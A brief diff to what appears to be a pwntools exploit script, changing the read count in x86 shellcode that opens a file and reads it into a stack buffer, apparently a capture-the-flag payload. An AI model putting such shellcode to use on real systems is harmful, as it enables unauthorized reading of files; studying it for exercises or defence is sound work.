@@ -19,7 +19,7 @@ shell_code = asm('\n'.join([
     'mov eax, 5', # Open syscall number
     'int 0x80',
 
-    'mov edx, 352', # Count
+    'mov edx, 10', # Count
     'mov ecx, esp', # Buffer
     'mov ebx, eax', # fd
     'mov eax, 3', # Read syscall number
